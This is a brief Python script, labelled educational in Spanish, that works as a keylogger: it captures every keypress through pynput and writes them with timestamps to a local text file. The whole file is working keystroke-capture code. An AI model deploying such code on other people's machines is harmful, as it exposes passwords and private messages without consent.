from pynput.keyboard import Listener
from datetime import datetime

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        char = key.char
    except AttributeError:
        char = f"[{key}]"

    log = f"{timestamp} - {char}"
    print(log)

    with open("teclas.txt", "a", encoding="utf-8") as file:
        file.write(log + "\n")

print("Programa iniciado - capturador de teclas (modo educativo)")

with Listener(on_press=on_press) as listener:
    listener.join()
